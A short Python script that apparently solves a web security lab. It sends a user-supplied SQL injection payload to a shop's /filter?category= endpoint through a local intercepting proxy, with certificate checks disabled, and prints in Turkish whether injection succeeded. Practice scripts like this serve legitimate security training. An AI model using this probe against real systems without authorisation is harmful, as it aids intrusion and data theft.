import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080' }


def exploit_sqli(url , payload):
    smallurl='/filter?category='
    r = requests.get(url+ smallurl+ payload, verify=False, proxies=proxies)
    if"Cheshire Cat Grin" in r.text:
        return True
    else:
        return False

if __name__ == "__main__":
    try:
        url =sys.argv[1].strip()
        payload = sys.argv[2].strip()
    except IndexError:
        print("[-] Usage:  %s <url> <payload>"% sys.argv[0])
        print('[-] For Example :  %s www.random.com "1=1" ' % sys.argv[0])
        sys.exit(-1)
    
    if exploit_sqli(url,payload):
        print("[+] SQL INJECTION BULUNDU")
    else:
        print("[-] SQL INJECTION BULUNAMADI")

